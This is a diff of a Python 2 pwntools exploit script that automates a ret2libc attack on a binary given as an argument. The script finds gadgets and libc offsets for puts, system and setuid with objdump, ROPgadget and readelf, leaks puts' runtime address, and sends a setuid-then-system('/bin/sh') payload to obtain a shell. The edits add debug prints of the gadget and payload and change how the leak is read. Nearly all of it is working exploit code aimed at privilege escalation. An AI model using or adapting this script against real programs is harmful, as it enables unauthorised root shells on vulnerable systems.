@@ -106,7 +106,7 @@ def retrieve_addr():
 	objdump = "objdump -D "+sys.argv[1]+" | grep \"%s\""
 	puts_dump = objdump  % ("puts@GLIBC_[0-9]")
 	main_dump = objdump  % ("<main>")
-	_pop_rdi = "ROPgadget --binary %s --ropchain | grep \"pop rdi ; ret\" " % (sys.argv[1])
+	_pop_rdi = "ROPgadget --binary %s | grep \"pop rdi ; ret\" " % (sys.argv[1])
 
 	libc = "readelf -s "+sys.argv[3]+" | grep \"%s\""
 	_libc_sys = libc % ("system@@GLIBC_[0-9]")
@@ -117,7 +117,8 @@ def retrieve_addr():
 	libc_system = int("0x"+subprocess.check_output(_libc_sys, shell=True).strip().split(" ")[1], 16)
 	libc_puts = int("0x"+subprocess.check_output(_libc_puts, shell=True).strip().split(" ")[1], 16)
 	libc_setuid = int("0x"+subprocess.check_output(_libc_setuid, shell=True).strip().split(" ")[1], 16)
-
+	
+	print subprocess.check_output(_pop_rdi, shell=True)
 	pop_rdi = p64(int(subprocess.check_output(_pop_rdi, shell=True).strip().split(" ")[0], 16))
 	puts_out = subprocess.check_output(puts_dump, shell=True).strip().split(" ")
 	plt_puts = p64(int("0x"+puts_out[0].split("\t")[0][0:-1], 16))
@@ -189,7 +190,7 @@ for x in range(0, j):
 
 #get leaked address
 #use leaked address to second round
-leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
+leaked_puts = p.recvline()[:8].strip().ljust(8, '\x00')
 
 
 print("Leaked PUTS @ "+str(leaked_puts))
@@ -207,6 +208,7 @@ if len(sys.argv)>10 or (len(sys.argv)>4 and sys.argv[4] == '-s'):
 
 payload = junk + setuid + pop_rdi + sh + system
 
+print payload
 #recv_and_send(i)
 
 p.sendline(payload)
